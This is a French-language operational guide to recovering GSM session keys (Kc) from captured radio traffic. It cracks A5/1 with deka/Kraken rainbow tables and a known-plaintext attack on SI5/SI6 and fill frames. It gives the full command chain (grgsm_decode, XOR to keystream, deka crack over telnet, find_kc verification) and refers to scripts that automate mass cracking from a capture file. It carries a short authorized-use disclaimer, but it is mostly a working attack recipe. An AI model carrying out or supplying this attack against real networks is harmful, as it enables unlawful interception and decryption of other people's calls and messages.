# Cracker A5/1 depuis un `.cfile` avec deka/Kraken

> Récupérer le **Kc** de session à partir d'une capture GSM chiffrée, en exploitant
> du **plaintext connu** (known-plaintext attack) + tables arc-en-ciel A5/1.
> Usage recherche / pentest autorisé / démonstration légale uniquement.

## Principe

A5/1 est un chiffrement par flot : `chiffré = plaintext XOR keystream`, où le keystream
ne dépend que de `(Kc, numéro de trame)`. Kraken/deka **récupèrent l'état interne A5/1
(puis le Kc) à partir d'un segment de keystream** (≥ 64 bits sans erreur).

L'attaquant **ne calcule jamais A5/1**. Il lui faut juste **du keystream**, obtenu par :

```
keystream = burst_chiffré  XOR  burst_plaintext_connu
```

Le plaintext connu = trames LAPDm **prévisibles** côté descendant, connues **sans la clé** :
- **bourrage** LAPDm (padding `0x2b`) — omniprésent dès qu'il n'y a rien à envoyer ;
- **SI5 / SI6** sur la SACCH (`06 1d` / `06 1e`) — contenu **fixe**, lisible en clair sur le BCCH
  (le LAI/cell `17 71 00 f1 10 00 01` est identique BCCH↔SACCH).

## Pièges qui coûtent des heures

1. **`my.bursts` doit être CHIFFRÉ, pas du keystream.** On l'obtient avec `grgsm_decode -p`
   **sans** `-e/-k`. Le donner tel quel à deka ne casse rien (deka veut du keystream).
2. **Un keystream ne se répète jamais** (change à chaque trame). Si ton fichier a des lignes
   tout-zéro ou des payloads répétés → c'est du contenu, pas du keystream.
3. **La 2ᵉ colonne des bursts = `(t1<<11)|(t3<<5)|t2`** = le compteur 22 bits (`framecount`)
   utilisé par A5/1 et par `find_kc`.
4. **Un bloc de contrôle = 4 trames consécutives** `FN, FN+1, FN+2, FN+3` (counts `+33`).
5. **`find_kc` veut l'état en DÉCIMAL + `x`** : `6FDDE217FE88D7A2` → `int(...,16)` + `"x"`.
6. **Une "Found" de deka peut être une fausse alarme.** Seul `find_kc` avec une **2ᵉ trame**
   confirme le Kc (`*** MATCHED ***`). Il faut souvent cracker plusieurs blocs.

## Chaîne complète

### 1. Extraire les bursts chiffrés (sans la clé)

```bash
grgsm_decode -m TCHF -t 2 -a 514 -s 1083333 \
  -c slice_dl_20260820121754.cfile -p -o speech.gsm > my.bursts
```
- `-p` = *print-bursts* → format `FN count: 114bits`
- pas de `-e/-k` → bursts chiffrés
- `-o speech.gsm` évite le plantage `Permission denied` sur `/tmp/speech.au.gsm`

### 2. Retrouver le plaintext connu (sans la clé)

Décoder le **BCCH (jamais chiffré)** donne SI5/SI6 et le bourrage en clair :
```bash
grgsm_decode -m BCCH_SDCCH4 -t 0 -a 514 -s 1083333 -c <cfile> -v
```
Une trame SACCH fait **23 octets** : `[L1 header 2o][LAPDm][2b…]`, ex. SI6 :
`07 00 03 03 2d 06 1e 17 71 00 f1 10 00 01 27 ff 2b 2b 2b 2b 2b 2b 2b`.

### 3. Ré-encoder le plaintext en bursts (GSM 05.03)

`GSMFrameCoder` (ou `gsmcode.py` ici) : 23 octets → 4 bursts de 114 bits.
Chaîne : **Fire (224,184) + 4 tail + convolutif ½ (K=5) + entrelacement 4 bursts**.
Convention validée au bit près : `msb_first=False, invert=True, jvar=0`.

```bash
gsmframecoder 0000030349061d9f6d1810800000000000000000000000
# ou:  python3 -c "from gsmcode import encode_hex; print(*encode_hex('...'),sep='\n')"
```

### 4. XOR chiffré ⊕ plaintext = keystream

```bash
python xor.py <burst_chiffré_114> <burst_plaintext_114>   # kraken/Utilities/xor.py
```
(ou `gsmframecoder <plaintext_hex> -x <burst_chiffré>`, qui fait encode+XOR d'un coup)

### 5. Cracker le keystream sur deka

```bash
telnet 0 6666
crack 000001000110000001000001111010000010100100000101100001111101011010011011...
# -> Cracking #N ...
# -> Found 6FDDE217FE88D7A2 @ 2 #N (table:124)
```

### 6. Remonter et vérifier le Kc avec find_kc

```bash
# état hex -> décimal + 'x'
DEC=$(python3 -c "print(int('6FDDE217FE88D7A2',16))")   # 8060847500745562018
/mnt/kraken/Utilities/find_kc ${DEC}x 2 <framecount1> <framecount2> <keystream2>
# ...
# KC(1): 9c d6 ed 7c ff d3 d0 00  *** MATCHED ***
```
- `framecount1` = count de la trame crackée
- `framecount2` + `keystream2` = une **autre** trame (du même bloc ou d'un autre) pour vérifier

## Scripts fournis (`/home/nirvana/a51_tools`)

| fichier | rôle |
|---|---|
| `ciphereds.py`  | charge `my.bursts` → bursts chiffrés + regroupement en blocs de 4 |
| `plaintexts.py` | catalogue de plaintext connu (fill/SI5/SI6) → 4 bursts ré-encodés |
| `gsmcode.py`    | codeur GSM 05.03 (validé au bit près vs GSMFrameCoder) |
| `crack.py`      | attaque un **bloc** précis : XOR → deka → find_kc |
| `crack_all.py`  | de bout en bout **depuis le `.cfile`** : extrait, craque en masse, croise find_kc |

### Lancer

```bash
# deka doit tourner (paplon.py + oclvankus.py + delta_client.py, port 6666)
cd /home/nirvana/a51_tools
python3 crack_all.py /home/nirvana/slice_dl_20260820121754.cfile
# ou un bloc précis :
python3 crack.py mycrack.bursts 105286 si6_sacch
```

## Notes

- Probabilité de hit ~22–24 %/table, ~50–60 % avec plusieurs jeux → cracker **plusieurs blocs**.
- Extrêmement sensible aux erreurs radio : un burst bruité = keystream faux = pas de hit.
- La SACCH répète SI5/SI6 tous les ~102–104 trames → mêmes plaintexts réutilisables en masse.
